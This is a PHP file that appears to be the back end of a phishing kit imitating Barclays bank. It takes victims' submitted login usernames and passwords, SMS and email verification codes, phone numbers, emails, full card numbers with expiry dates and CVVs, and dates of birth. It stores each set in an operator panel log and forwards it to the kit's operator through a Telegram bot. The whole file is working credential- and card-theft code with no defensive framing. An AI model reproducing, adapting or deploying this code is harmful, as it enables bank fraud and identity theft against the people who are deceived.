<?php
require "../main.php";



$panel = str_replace('auth/post.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];

function post($data){
if(empty(trim($data))){
return "NO_DATA";
}else{
return htmlspecialchars($_POST[$data]);
}
}


function sendBot($url){
$ci = curl_init();
curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ci, CURLOPT_URL, $url);
$res = curl_exec($ci);
curl_close($ci);
return $res;
}


if(isset($_POST['user'])){

$login = post("user");
$pass = post("pass");

$text = urlencode("
/- BARCLAYS LOGIN -/ $ip
USER: ".$_POST['user']."
PASS: ".$_POST['pass']."
---------------------------------------
PANEL : $panel
");

$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ LOGIN [ $login | $pass ] ";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
sendBot($url);

}





if(isset($_POST['notes'])){

$text = urlencode("
/- BARCLAYS NOTIFICATION -/ $ip
".$_POST['notes']."
---------------------------------------
PANEL : $panel
");

$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ NOTIFICATiON [ ".$_POST['notes']." ] ";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
sendBot($url);

}




if(isset($_POST['insts'])){

$text = urlencode("
/- BARCLAYS INST 2 RENDEZ-VOUS -/ $ip
Day: ".$_POST['day']."
Hour: ".$_POST['hour']."
Type: RENDZ-VOUS!
---------------------------------------
PANEL : $panel
");

$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ INST 2 RDV [ Day: ".$_POST['day']." Hour: ".$_POST['hour']." ] ";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
sendBot($url);

}






if(isset($_POST['phone'])){

$login = post("name2");
$pass = post("phone");

$text = urlencode("
/- BARCLAYS INFO -/ $ip
Name: ".$_POST['name2']."
PHONE: ".$_POST['phone']."
EMAIL: ".$_POST['email_']."
---------------------------------------
PANEL : $panel
");

$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ INFO [ $login | $pass ] ";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
sendBot($url);

}





if(isset($_POST['sms'])){

$sms = post("sms");

$telegram_content = urlencode("
/- BARCLAYS SMS -/ $ip
CODE : $sms
---------------------------------------
PANEL : $panel
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ SMS [ $sms ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);


}






if(isset($_POST['email'])){

$sms = post("email");

$telegram_content = urlencode("
/- BARCLAYS EMAIL -/ $ip
CODE : $sms
---------------------------------------
PANEL : $panel
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ EMAIL [ $sms ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);


}











if(isset($_POST['inst'])){

$sms = post("inst");

$telegram_content = urlencode("
/- BARCLAYS INST -/ $ip
ANSWER : $sms
---------------------------------------
PANEL : $panel
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ INST [ $sms ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);


}





if(isset($_POST['cc'])){

$name = $_POST['name'];
$cc = $_POST['cc'];
$exp = $_POST['exp'];
$cvv = $_POST['cvv'];


$telegram_content = urlencode("
/- BARCLAYS CARD -/ $ip
Name : $name
CC : $cc
EXP : $exp
CVV : $cvv
---------------------------------------
PANEL : $panel
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ CARD [ $name | $cc | $exp | $cvv ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);


}




if(isset($_POST['logapp'])){

$name = $_POST['card'];
$exp = $_POST['exp'];
$cvv = $_POST['dob'];


$telegram_content = urlencode("
/- BARCLAYS LOGIN APP INFO -/ $ip
LAST 4: $name
EXP : $exp
DOB : $cvv
---------------------------------------
PANEL : $panel
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ LOGIN APP [ $name | $exp | $cvv ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);


$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);


}





?>